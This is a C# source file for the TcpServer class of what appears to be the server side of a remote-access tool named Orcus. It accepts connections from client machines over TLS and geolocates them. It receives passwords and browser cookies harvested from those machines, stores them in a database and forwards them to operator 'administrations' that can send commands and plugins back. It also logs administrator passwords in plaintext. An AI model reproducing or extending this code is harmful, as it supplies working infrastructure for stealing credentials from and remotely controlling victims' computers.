using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using Orcus.Server.Core.Args;
using Orcus.Server.Core.ClientAcceptor;
using Orcus.Server.Core.ClientManagement;
using Orcus.Server.Core.Config;
using Orcus.Server.Core.Connection;
using Orcus.Server.Core.Database;
using Orcus.Server.Core.Database.FileSystem;
using Orcus.Server.Core.DynamicCommands;
using Orcus.Server.Core.Extensions;
using Orcus.Server.Core.GeoIp;
using Orcus.Shared.Communication;
using Orcus.Shared.Connection;
using Orcus.Shared.Core;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.NetSerializer;

namespace Orcus.Server.Core
{
    public class TcpServer : IDisposable, ITcpServerInfo
    {
        private static readonly Logger Logger = LogManager.GetLogger("Server");

        public const int ApiVersion = 9;
        private readonly object _administrationIdLock = new object();
        private readonly object _administrationListLock = new object();
        private readonly X509Certificate2 _certificate;
        private readonly List<IClientAcceptor> _clientAcceptors;
        private readonly Ip2LocationService _ip2LocationService;
        private List<BlockedIpAddresses> _blockedIpAddresses;
        private ClientOnlineChecker _clientOnlineChecker;

        private readonly Lazy<Serializer> _welcomePackageSerializer =
            new Lazy<Serializer>(() => new Serializer(new[] {typeof(WelcomePackage)}));

        // ReSharper disable once InconsistentNaming
        internal static TcpServer _currentInstance;

        public TcpServer(DatabaseManager databaseManager, List<IpAddressInfo> ipAddresses, X509Certificate2 certificate)
        {
            DatabaseManager = databaseManager;
            _certificate = certificate;
            Listeners = ipAddresses.Select(x => new Listener(IPAddress.Parse(x.Ip), x.Port)).ToList();
            Clients = new ConcurrentDictionary<int, Client>();

            Administrations = new SortedDictionary<ushort, Administration>();
            _clientAcceptors = new List<IClientAcceptor>
            {
                new ClientAcceptor0(databaseManager),
                new ClientAcceptor1(databaseManager),
                new ClientAcceptor2(databaseManager),
                new ClientAcceptor3(databaseManager),
                new ClientAcceptor4(databaseManager),
                new ClientAcceptor5(databaseManager)
            };
            DynamicCommandManager = new DynamicCommandManager(DatabaseManager, this);
            OnlineSince = DateTime.UtcNow;
            PushManager = new PushManager(databaseManager);
            _ip2LocationService = new Ip2LocationService();
            _currentInstance = this;
        }

        public void Dispose()
        {
            DynamicCommandManager.Dispose();

            if (IsRunning)
                Stop();

            DatabaseManager.Dispose();
            _clientOnlineChecker?.Dispose();
        }

        public bool IsRunning { get; private set; }
        public bool IsLoading { get; set; }
        public List<Listener> Listeners { get; }
        public string Password { get; set; }
        public string DnsHostName { get; set; }
        public PushManager PushManager { get; }
        public bool EnableNamedPipes { get; set; }

        public string Ip2LocationEmailAddress { get; set; }
        public string Ip2LocationPassword { get; set; }

        public DateTime OnlineSince { get; }
        public ConcurrentDictionary<int, Client> Clients { get; }
        public SortedDictionary<ushort, Administration> Administrations { get; }
        public DynamicCommandManager DynamicCommandManager { get; }
        public DatabaseManager DatabaseManager { get; }

        public event EventHandler IsRunningChanged;
        public event EventHandler AdministrationsChanged;
        public event EventHandler ClientsChanged;

        public void InitializeIpBlockList(string path)
        {
            Logger.Debug("Read IP block list from {0}", Path.GetFileName(path));
            var content = File.ReadAllText(path);
            _blockedIpAddresses = new List<BlockedIpAddresses>();
            foreach (var line in content.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries))
            {
                var trimmedLine = line?.Trim();

                if (string.IsNullOrWhiteSpace(trimmedLine) || trimmedLine.StartsWith("#"))
                    continue;

                BlockedIpAddresses blockedIpAddresses;
                if (BlockedIpAddresses.TryParseCIDRNotation(trimmedLine, out blockedIpAddresses) ||
                    BlockedIpAddresses.TryParseIpAddressRange(trimmedLine, out blockedIpAddresses))
                {
                    _blockedIpAddresses.Add(blockedIpAddresses);
                    continue;
                }

                Logger.Warn("The blocked IP address \"{0}\" could not be parsed", trimmedLine);
            }

            if (_blockedIpAddresses.Count == 1)
                Logger.Info("Loaded {0} IP address block", _blockedIpAddresses.Count);
            else if (_blockedIpAddresses.Count > 1)
                Logger.Info("Loaded {0} IP address blocks", _blockedIpAddresses.Count);
        }

        public static void WriteDefaultIpBlockList(string path)
        {
            File.WriteAllText(path,
                "# Orcus IP Address block list\r\n# Usage: One IP address per line. You can use the range notation as well as the CIDR notation\r\n# Examples: 127.0.0.1, 12.15-16.1-30.10-255, 12.15.0.0/16\r\n");
        }

        public void ChangeGroup(List<int> clients, string newName)
        {
            Logger.Info("Setting new group for {0} client(s) to \"{1}\"", clients.Count, newName);

            foreach (var clientId in clients)
            {
                Client client;
                if (Clients.TryGetValue(clientId, out client))
                    client.Data.Group = newName;
            }

            foreach (var client in clients)
                DatabaseManager.SetGroup(newName, client);

            Logger.Debug("Group successfully changed to \"{0}\" - notify the administrations", newName);
            lock (_administrationListLock)
                foreach (var administration in Administrations)
                    administration.Value.NotifyGroupChanged(clients, newName);
        }

        public void AddListener(IpAddressInfo ipAddress)
        {
            var listener = new Listener(IPAddress.Parse(ipAddress.Ip), ipAddress.Port);
            Listeners.Add(listener);
            if (IsRunning)
            {
                listener.Connect += ListenerOnConnect;
                listener.Start();
            }
        }

        public void RemoveListener(IpAddressInfo ipAddress)
        {
            var listener =
                Listeners.FirstOrDefault(x => x.IpAddress.ToString() == ipAddress.Ip && x.Port == ipAddress.Port);
            if (listener == null)
                return;

            RemoveListener(listener);
        }

        public void RemoveListener(Listener listener)
        {
            listener.Stop();
            Listeners.Remove(listener);
        }

        public async void Start()
        {
            IsLoading = true;
            if (_certificate == null)
            {
                Logger.Fatal("Start failed: No SSL certificate loaded");
                return;
            }
            await Task.Run(() => _ip2LocationService.Start(Ip2LocationEmailAddress, Ip2LocationPassword));

            Logger.Info("Starting all listeners...");
            foreach (var listener in Listeners)
            {
                listener.Connect += ListenerOnConnect;
                listener.Start();
                Logger.Debug("Listener {0}:{1} started successfully", listener.IpAddress, listener.Port);
            }

            if (bool.Parse(GlobalConfig.Current.IniFile.GetKeyValue("SERVER", "CheckForDeadConnections")))
            {
                Logger.Debug("Start online checker");
                if (_clientOnlineChecker == null)
                    _clientOnlineChecker =
                        new ClientOnlineChecker(int.Parse(GlobalConfig.Current.IniFile.GetKeyValue("SERVER", "CheckForDeadConnectionsInterval")),
                            Clients);
                else
                    _clientOnlineChecker.Start();
            }

            IsRunning = true;
            IsLoading = false;
            IsRunningChanged?.Invoke(this, EventArgs.Empty);
        }

        public void Stop()
        {
            IsLoading = true;

            if (_ip2LocationService.IsStarted)
                _ip2LocationService.Stop();

            Logger.Info("Stopping all listeners...");
            foreach (var listener in Listeners)
            {
                listener.Connect -= ListenerOnConnect;
                listener.Stop();
                Logger.Debug("Listener {0}:{1} stopped", listener.IpAddress, listener.Port);
            }
            Logger.Info("All Listeners stopped");
            Logger.Debug("Disconnect all administrations");
            lock (_administrationListLock)
            {
                foreach (var administration in Administrations.ToList())
                    administration.Value.Dispose();
            }

            Logger.Debug("Disconnect all clients");
            foreach (var client in Clients)
                client.Value.Dispose();

            Logger.Info("All clients and administrations disconnected");
            _clientOnlineChecker?.Stop();
            IsRunning = false;
            IsLoading = false;
            IsRunningChanged?.Invoke(this, EventArgs.Empty);
        }

        public void ReloadGeoIpLocationService()
        {
            _ip2LocationService.Start(Ip2LocationEmailAddress, Ip2LocationPassword);
        }

        private void ListenerOnConnect(object sender, TcpClientConnectedEventArgs args)
        {
            Logger.Debug("Listener reports a new client");
            //we don't do that in a thread to save performance if the client should be blocked
            if (_blockedIpAddresses?.Count > 0)
            {
                Logger.Debug("Blocked IP addresses > 0; check if the client {0} is blocked", args.TcpClient.Client.RemoteEndPoint);
                var address = ((IPEndPoint) args.TcpClient.Client.RemoteEndPoint).Address;
                foreach (var blockedIpAddresse in _blockedIpAddresses)
                {
                    if (blockedIpAddresse.IsBlocked(address))
                    {
                        Logger.Info("Client ({0}) blocked", address);
                        args.TcpClient.Close();
                        return;
                    }
                }

                Logger.Debug("Client {0} is not blocked", args.TcpClient.Client.RemoteEndPoint);
            }

            new Thread(() =>
            {
                try
                {
                    Logger.Info("New client tries to connect...");
                    Connect(args.TcpClient);
                }
                catch (Exception ex)
                {
                    Debug.Print(ex.ToString());
                    Logger.Error(ex.Message, "Error when connecting with client");
                }
            }) {Name = "Connection_thread_for_" + args.TcpClient.Client.RemoteEndPoint}.Start();
        }

        private void Connect(TcpClient tcpClient)
        {
            Logger.Debug("Initiate SSL connection");
            var sslStream = new SslStream(tcpClient.GetStream());
            sslStream.AuthenticateAsServer(_certificate, false, SslProtocols.Tls, true);
            Logger.Debug("SSL connection initiated");

#if !DEBUG
            var timeout = int.Parse(GlobalConfig.Current.IniFile.GetSection("SERVER").GetKey("ConnectionTimeout").Value);
            tcpClient.ReceiveTimeout = timeout;
            tcpClient.SendTimeout = timeout;
            Logger.Debug("Set send/receive timeout to {0}", timeout);
#endif
            var binaryReader = new BinaryReader(sslStream);
            var binaryWriter = new BinaryWriter(sslStream);

            try
            {
                switch ((AuthentificationIntention) binaryReader.ReadByte())
                {
                    case AuthentificationIntention.ClientRegister:
                        Logger.Info("Intention: Client ({0})", ((IPEndPoint) tcpClient.Client.RemoteEndPoint).Address);

                        Logger.Debug("Expect client version...");
                        var version = binaryReader.ReadInt32();
                        Logger.Debug("Client version: {0}", version);

                        var clientAcceptor =
                            _clientAcceptors.FirstOrDefault(x => x.ApiVersion == version);
                        if (clientAcceptor == null)
                        {
                            Logger.Error("Unsupported Client connected (API version: {0})", version);
                            binaryWriter.Write((byte) PrimitiveProtocol.OutdatedVersion);
                            break;
                        }

                        Logger.Debug("Client acceptor found, response with OK");
                        binaryWriter.Write((byte) PrimitiveProtocol.ResponseEverythingIsAwesome);

                        ClientData clientData;
                        CoreClientInformation computerInformation;
                        bool isNewClient;

                        if (!clientAcceptor.LogIn(sslStream, binaryReader, binaryWriter, out clientData,
                            out computerInformation, out isNewClient))
                            break;

                        if (Clients.ContainsKey(clientData.Id))
                        {
                            Logger.Error("Client from this computer is already connected (CI-{0})", clientData.Id);
                            break;
                        }

                        LocationInfo locationInfo = null;
                        if (_ip2LocationService.IsStarted)
                        {
                            var ipAddress = ((IPEndPoint) tcpClient.Client.RemoteEndPoint).Address.ToString();
                            Logger.Debug("Ip2Location activated, locating {0}", ipAddress);
                            locationInfo = _ip2LocationService.GetLocationInfo(ipAddress);
                            if (locationInfo == null)
                                Logger.Debug("LocationInfo is null");
                            else
                                Logger.Debug(
                                    "Locating successful. (Country: {0}, Region: {1}, City: {2}, Zip code: {3}, Lat: {4}, Lon: {5}, Timezone: {6})",
                                    locationInfo.CountryName, locationInfo.Region, locationInfo.City,
                                    locationInfo.ZipCode, locationInfo.Latitude, locationInfo.Longitude,
                                    locationInfo.Timezone);

                            if (locationInfo != null)
                                DatabaseManager.SetClientLocation(clientData.Id, locationInfo, ipAddress);
                        }

                        Logger.Info("Welcome {0} on this server (CI-{1}){2}", computerInformation.UserName,
                            clientData.Id,
                            locationInfo != null
                                ? $" (located in {locationInfo.Country}/{locationInfo.Region})"
                                : "");

                        var client = new Client(clientData, computerInformation, tcpClient, binaryReader, binaryWriter, sslStream,
                            this, locationInfo);
                        client.Disconnected += ClientOnDisconnected;
                        client.SendToAdministration += ClientSendToAdministration;
                        client.ReceivedStaticCommandResult += ClientOnReceivedStaticCommandResult;
                        client.ExceptionsReveived += ClientOnExceptionsReveived;
                        client.PasswordsReceived += ClientOnPasswordsReceived;
                        client.ComputerInformationReceived += ClientOnComputerInformationReceived;
                        client.PluginLoaded += ClientOnPluginLoaded;
                        client.BeginListen();
                        ClientConnected(client, isNewClient);

                        if (isNewClient)
                            DatabaseManager.NewClientConnected();

                        DatabaseManager.ClientConnected(client.Id);
                        return;
                    case AuthentificationIntention.Administration:
                        Logger.Info("Intention: New Administration");
                        Logger.Debug("Expect administration API version...");
                        var administrationApiVersion = binaryReader.ReadInt32();
                        Logger.Debug("Administration API version: {0}", administrationApiVersion);

                        if (administrationApiVersion != ApiVersion)
                        {
                            binaryWriter.Write((byte) AuthentificationFeedback.InvalidApiVersion);
                            binaryWriter.Write(ApiVersion);
                            Logger.Error("Invalid API version (version: {0})", administrationApiVersion);
                            return;
                        }

                        IConnection connection = null;
                        if (((IPEndPoint) tcpClient.Client.RemoteEndPoint).Address.Equals(IPAddress.Loopback) &&
                            bool.Parse(GlobalConfig.Current.IniFile.GetKeyValue("SERVER", "EnabledNamedPipe")))
                        {
                            Logger.Debug(
                                "IP address is the Loop back address and named pipes are enabled; offer a named pipe");
                            binaryWriter.Write((byte) AuthentificationFeedback.ApiVersionOkayWantANamedPipe);
                            Logger.Debug("Wait for answer...");
                            if (binaryReader.ReadBoolean())
                            {
                                Logger.Info("Begin connecting using named pipes");
                                NamedPipeServerStream namedPipeServerStream;
                                string pipeName;

                                Logger.Debug("Find a free named pipe address and start server");
                                while (true)
                                {
                                    try
                                    {
                                        pipeName = Guid.NewGuid().ToString("N");
                                        namedPipeServerStream = new NamedPipeServerStream(pipeName, PipeDirection.InOut,
                                            1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
                                        break;
                                    }
                                    catch (IOException)
                                    {
                                        //if the name is already taken
                                    }
                                }

                                Logger.Debug("Address is {0}, send name to administration", pipeName);
                                binaryWriter.Write(pipeName);

                                Logger.Debug("Wait for a connection...");
                                var result = namedPipeServerStream.BeginWaitForConnection(null, null);
                                var success =
                                    result.AsyncWaitHandle.WaitOne(
                                        TimeSpan.FromMilliseconds(
                                            int.Parse(GlobalConfig.Current.IniFile.GetKeyValue("SERVER",
                                                "NamedPipeConnectionTimeout"))));
                                if (!success)
                                {
                                    namedPipeServerStream.Dispose();
                                    Logger.Warn("Administration did not connect to the created named pipe server");
                                    break;
                                }

                                Logger.Debug("Administration connected successfully to the named pipe server");
                                namedPipeServerStream.EndWaitForConnection(result);

                                Logger.Debug("Dispose TCP streams");
                                //connected
                                using (binaryReader)
                                using (binaryWriter)
                                using (sslStream)
                                    tcpClient.Close();

                                connection = new NamedPipeConnection(namedPipeServerStream);
                            }
                        }
                        else
                        {
                            Logger.Debug("Send password request...");
                            binaryWriter.Write((byte) AuthentificationFeedback.ApiVersionOkayGetPassword);
                        }

                        if (connection == null)
                            connection = new TcpConnection(tcpClient, sslStream, binaryReader, binaryWriter);

                        Logger.Debug("Wait for the password...");

                        var password = connection.BinaryReader.ReadString();
                        if (password != Password)
                        {
                            Logger.Debug("Sent password ({0}) does not equal the current password ({1})", password, Password);
                            connection.BinaryWriter.Write((byte) AuthentificationFeedback.InvalidPassword);
                            Logger.Error("Invalid password");
                            break;
                        }

                        Logger.Debug("The password is correct ({0})", password);

                        lock (_administrationIdLock)
                        {
                            ushort administrationId;
                            if (!GetFreeAdministrationId(out administrationId))
                            {
                                Logger.Debug("Response with ServerIsFull");
                                connection.BinaryWriter.Write((byte) AuthentificationFeedback.ServerIsFull);
                                Logger.Info("Rejected administration because there aren't any free ids");
                                break;
                            }

                            Logger.Debug("Response with Accepted");
                            connection.BinaryWriter.Write((byte) AuthentificationFeedback.Accepted);
                            Logger.Info("Administration accepted. Welcome (AI-{0})", administrationId);

                            Logger.Debug("Prepare welcome package...");

                            var ipAddresses =
                                Listeners.Select(x => new IpAddressInfo {Ip = x.IpAddress.ToString(), Port = x.Port})
                                    .ToList();

                            IPAddress localIp;
                            try
                            {
                                localIp = NetworkHelper.GetLocalIpAddress();
                            }
                            catch (Exception)
                            {
                                localIp = null;
                            }
                            var interNetworkPort = (ipAddresses.FirstOrDefault(x => x.Ip == localIp?.ToString()) ??
                                                    ipAddresses.FirstOrDefault(x => !x.Ip.Equals("127.0.0.1")) ??
                                                    ipAddresses.First()).Port;

                            if (!string.IsNullOrEmpty(DnsHostName))
                                ipAddresses.Add(new IpAddressInfo {Ip = DnsHostName, Port = interNetworkPort});
                            _welcomePackageSerializer.Value.Serialize(connection.BaseStream,
                                new WelcomePackage
                                {
                                    ExceptionCount = (int) DatabaseManager.Exceptions,
                                    IpAddresses = ipAddresses
                                });

                            Logger.Debug("Welcome package sent, administration accepted");

                            var administration = new Administration(administrationId, connection, this);
                            administration.Disconnected += AdministrationOnDisconnected;
                            administration.SendPackageToClient += AdministrationOnSendPackageToClient;
                            administration.RemoveClients += AdministrationOnRemoveClients;
                            lock (_administrationListLock)
                                Administrations.Add(administrationId, administration);
                        }
                        AdministrationsChanged?.Invoke(this, EventArgs.Empty);
                        return;
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Exception occurred when connecting with a client");
            }

            Logger.Debug("Dispose TCP streams");

            using (binaryReader)
            using (binaryWriter)
            using (sslStream)
                tcpClient.Close();
        }

        private void ClientOnPluginLoaded(object sender, PluginLoadedEventArgs e)
        {
            var client = (Client) sender;
            Logger.Info("Plugin {0:D} ({1}) successfully loaded (CI-{2})", e.PluginInfo.Guid,
                e.PluginInfo.Version, client.Id);

            lock (_administrationListLock)
                foreach (var administration in Administrations)
                    administration.Value.NotifyPluginAvailable(client, e.PluginInfo);
        }

        private void ClientOnReceivedStaticCommandResult(object sender, DynamicCommandEvent dynamicCommandEvent)
        {
            var client = (Client) sender;

            DynamicCommandManager.ReceivedResult(dynamicCommandEvent, client);
            Logger.Debug("Received dynamic command result ({0}) from client CI-{1}", dynamicCommandEvent.Status, client.Id);
        }

        private void ClientOnComputerInformationReceived(object sender, ComputerInformationReceivedEventArgs e)
        {
            var client = (Client) sender;

            Logger.Debug("Received computer information from client CI-{0}", client.Id);

            if (e.Redirect)
            {
                Logger.Debug("Client requests a redirect of the computer information to administration AI-{0}", e.Administration);

                Administration administration;
                lock (_administrationListLock)
                    if (Administrations.TryGetValue(e.Administration, out administration))
                        administration.SendComputerInformation(e.ComputerInformation);
            }

            DatabaseManager.SetComputerInformation(e.ComputerInformation, client.Id);
            if (!client.Data.IsComputerInformationAvailable)
            {
                Logger.Debug("Computer information were not available until now; notify administrations");
                client.Data.IsComputerInformationAvailable = true;
                lock (_administrationListLock)
                    foreach (var administration in Administrations)
                        administration.Value.NotifyComputerInformationAvailable(client);
            }

            foreach (var administration in Administrations.Where(x => !e.Redirect || x.Key != e.Administration))
                administration.Value.NotifyComputerInformationAvailable(client);
        }

        private void ClientOnPasswordsReceived(object sender, PasswordsReceivedEventArgs e)
        {
            var client = (Client) sender;
            Logger.Debug("Passwords received from CI-{0}", client.Id);
            DatabaseManager.AddPasswords(e.PasswordData.Passwords, e.PasswordData.Cookies, client.Id);
            if (!client.Data.IsPasswordDataAvailable)
            {
                client.Data.IsPasswordDataAvailable = true;
                lock (_administrationListLock)
                    foreach (var administration in Administrations)
                        administration.Value.NotifyPasswordsAvailable(client);
            }

            if (e.Redirect)
            {
                Logger.Debug("Client requests a redirect of the computer information to administration AI-{0}", e.Administration);

                Administration administration;
                if (Administrations.TryGetValue(e.Administration, out administration))
                    administration.SendPasswords(DatabaseManager.GetPasswords(client.Id));
            }
            foreach (var administration in Administrations.Where(x => !e.Redirect || x.Key != e.Administration))
                administration.Value.NotifyPasswordsAvailable(client);
        }

        private void ClientConnected(Client client, bool isNewClient)
        {
            Clients.TryAdd(client.Id, client);

            Logger.Debug("Notify administrations about the connection of CI-{0}", client.Id);
            lock (_administrationListLock)
                foreach (var administration in Administrations)
                {
                    if (!isNewClient)
                        administration.Value.NotifyClientConnected(client);
                    else
                        administration.Value.NotifyNewClient(client);
                }

            ClientsChanged?.Invoke(this, EventArgs.Empty);
            DynamicCommandManager.OnClientJoin(client);
        }

        private void ClientSendToAdministration(object sender, SendPackageToAdministrationEventArgs e)
        {
            Administration administration;
            if (Administrations.TryGetValue(e.AdministrationId, out administration))
                administration.SendPackage(e.Command, e.WriterCall);

            Logger.Debug("Send package (id {0}, {1} B) from client CI-{2} to administration AI-{3}", e.Command,
                e.WriterCall.Size, ((Client) sender).Id, e.AdministrationId);
        }

        private void AdministrationOnSendPackageToClient(object sender, SendPackageToClientEventArgs e)
        {
            Logger.Debug("Send package (id {0}, {1} B) from administration AI-{2} to client CI-{3}", e.Command,
                e.WriterCall.Size, ((Administration) sender).Id, e.ClientId);

            Client client;
            if (Clients.TryGetValue(e.ClientId, out client))
                client.SendPackage(e.Command, e.WriterCall);
        }

        private void AdministrationOnDisconnected(object sender, EventArgs e)
        {
            lock (_administrationListLock)
                Administrations.Remove(((Administration) sender).Id);
            AdministrationsChanged?.Invoke(this, EventArgs.Empty);
        }

        private void ClientOnDisconnected(object sender, EventArgs e)
        {
            var client = (Client) sender;

            Logger.Debug("Notify administrations about the disconnect of CI-{0}", client.Id);
            lock (_administrationListLock)
                foreach (var administration in Administrations)
                    administration.Value.NotifyClientDisconnected(client);

            Clients.TryRemove(client.Id, out client);

            DynamicCommandManager.ClientDisconnected(client);

            ClientsChanged?.Invoke(this, EventArgs.Empty);
            DatabaseManager.SetLastSeen(client.Id);
        }

        private void ClientOnExceptionsReveived(object sender, ExceptionsReveivedEventArgs e)
        {
            Logger.Info("Received {0} exception{1} from CI-{2}", e.Exceptions.Count,
                e.Exceptions.Count == 1 ? "" : "s",
                ((Client) sender).Id);

            foreach (var exceptionInfo in e.Exceptions)
                DatabaseManager.AddException(((Client) sender).Id, exceptionInfo);
        }

        private void AdministrationOnRemoveClients(object sender, MultipleClientsEventArgs e)
        {
            var clientsRemoved = new List<int>();
            Logger.Debug("Removing {0} clients (command from AI-{1})", e.Clients.Count, ((Administration) sender).Id);

            foreach (var client in e.Clients)
            {
                if (Clients.ContainsKey(client))
                    continue;

                DatabaseManager.RemoveClient(client);
                clientsRemoved.Add(client);
            }

            Logger.Debug("Notify administrations about the removed clients");

            lock (_administrationListLock)
                foreach (var administration in Administrations)
                    administration.Value.NotifyClientsRemoved(clientsRemoved);
        }

        private bool GetFreeAdministrationId(out ushort id)
        {
            id = 0;

            if (Administrations.Count >= ushort.MaxValue)
                return false;

            id = Administrations.GetFirstUnusedKey();
            return true;
        }
    }
}